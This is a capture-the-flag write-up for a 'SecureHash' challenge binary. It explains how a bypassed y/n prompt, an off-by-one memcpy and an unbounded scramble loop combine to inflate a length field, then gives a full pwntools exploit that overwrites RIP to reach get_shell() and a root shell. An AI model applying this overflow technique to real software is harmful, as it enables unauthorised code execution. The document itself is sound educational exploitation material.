### Challenge Overview

The SecureHash target presents a multi-stage memory corruption challenge. The objective is to achieve arbitrary code execution and spawn a root shell by subverting global memory state to artificially induce a stack buffer overflow.
### Vulnerability Analysis

The exploitation path hinges on chaining three distinct vulnerabilities spread across the application's global memory space and execution logic.

The initial primitive relies on an unhandled edge case within the `interface()` loop's state management. The application prompts the user to apply PIN scrambling with `[y/n]`, subsequently clearing the buffer via `initialize_scratch_space()` based on these explicit inputs. By supplying an unexpected character (e.g., 'z'), the initialization branch is entirely bypassed, allowing the contents of the global 64-byte `notepad` buffer to persist across multiple execution loops.

The second vulnerability involves an off-by-one pointer calculation during string concatenation. The binary constructs the notepad payload via `memcpy(&g_scratch_space.notepad[++firstname_len], lastname, lastname_len);`. This logic inherently forces a null byte (`\x00`) to reside between the concatenated strings.

The critical logic flaw manifests in the `scramble()` function, which iterates over the global buffer using `while (g_scratch_space.notepad[i]) g_scratch_space.notepad[i++] |= 0x42;`. This iteration lacks explicit spatial bounds checking and relies entirely on hitting a null terminator to halt execution. Furthermore, the `g_scratch_space` struct aligns the 64-byte `notepad` buffer immediately adjacent to a control variable, `pin_len`.
### Exploitation Strategy

Because the final vulnerable function, `mask_with_pin()`, safely utilizes `fgets(pin, g_scratch_space.pin_len, stdin)` to write into a 32-byte stack buffer, we cannot overflow the stack while `pin_len` remains within its legitimate boundary of 31. We must orchestrate a complex BSS grooming strategy to artificially inflate this value.

**Stage 1: State Retention and The "Dirty Buffer"** We initialize the environment by setting the intended PIN size to 31 (`0x1f`). During the first loop, we populate the notepad with a 30-byte first name and a 30-byte last name, forcing a null byte at index 31. We then bypass the state clearance by passing 'z', creating a "dirty" global buffer.

**Stage 2: The Shift and Crush** In the second loop, we supply a 29-byte first name and a 30-byte last name. Because `firstname_len` is 30 (including the newline), the pre-increment operation (`++firstname_len`) shifts the pointer to exactly 31. Consequently, the `memcpy` for the last name begins writing at index 31, completely crushing the terminating `\x00` retained from the first loop.

**Stage 3: The Runaway Scramble** With the internal null terminator eliminated, we trigger the scrambling routine. The `while` loop fails to stop at the end of the 64-byte notepad, incrementing `i` into index 64, where `pin_len` resides. The bitwise OR operation modifies our original PIN size of `0x1f` (`0x1f | 0x42`), inflating the integer to `0x5f` (95).

**Stage 4: Stack Smashing and Code Execution** The execution flow ultimately reaches `mask_with_pin()`, which now executes `fgets` with a read limit of 95 bytes against a 32-byte stack buffer. This grants a massive linear overflow primitive. We dispatch a 64-byte payload—56 bytes of padding to exhaust the buffer and clobber the Saved Base Pointer (RBP), followed by an 8-byte overwrite of the Instruction Pointer (RIP) directing execution to `0x400b21` (`get_shell()`), successfully yielding a root shell.

### The Exploit
```python
import struct
from pwn import *
import interact

# --- Constants & Addresses ---
GET_SHELL_ADDR = 0x400b21

# --- Helper Functions ---
def enter_names(p, first_name, last_name):
    """Helper to quickly send the first and last names."""
    p.readuntil(b"name: ")
    p.sendline(first_name)
    p.readuntil(b"name: ")
    p.sendline(last_name)

p = interact.Process()

# ==========================================
# Phase 1: Setup and The "Dirty Buffer"
# ==========================================
print("Phase 1: Setting up the dirty buffer (Loop 1)")
p.readuntil(b"use: ")
p.sendline(b"31")

# Loop 1: 30 bytes of A and B
enter_names(p, b'A'*30, b'B'*30)

# Bypass the clear buffer check by sending 'z'
p.readuntil(b"[y/n] ")
p.sendline(b"z")

# ==========================================
# Phase 2: The Shift & Crush
# ==========================================
print("Phase 2: Off-by-one pointer shift to crush the null byte")
p.readuntil(b"[y/n] ")
p.sendline(b"y") 

# Loop 2: 29 bytes of C and 30 bytes of D
enter_names(p, b'C'*29, b'D'*30)

# ==========================================
# Phase 3: The Killshot (Stack Smashing)
# ==========================================
print("Phase 3: Triggering runaway scramble and overflowing the stack")

# Trigger the scramble function and prompt for PIN
p.readuntil(b"[y/n] ")
p.sendline(b"y")

p.readuntil(b"use: ")

# Payload Breakdown:
# - 48 bytes to fill the buffer and local variables
# - 8 bytes to overwrite the Saved Base Pointer (RBP)
#   (56 bytes total of 'A's covers both of the above)
# - 8 bytes to overwrite the Return Address (RIP) with get_shell()
payload = b'A'*56 + p64(GET_SHELL_ADDR)
    
print("Sending payload to overwrite RIP...")
p.sendline(payload)

print("Exploit finished. Dropping to root shell!")
p.interactive()
```